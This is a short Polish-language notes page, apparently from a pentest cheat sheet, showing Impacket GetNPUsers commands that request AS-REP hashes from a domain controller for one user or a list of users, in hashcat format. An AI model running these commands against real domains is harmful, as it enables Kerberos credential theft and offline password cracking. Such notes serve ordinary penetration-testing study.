---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Impacket-GetNPUsers

```
Impacket-GetNPUsers -dc-ip 10.20.10.5 cyber.local/fredf
```

lub gdy sprawdzamy kilku użytkowników i mamy stworzony plik users z nazwami użytkowników

{% code overflow="wrap" %}
```python
Impacket-GetNPUsers -dc-ip 10.20.10.5 -no-pass -format hashcat -userfile users cyber.local/
```
{% endcode %}
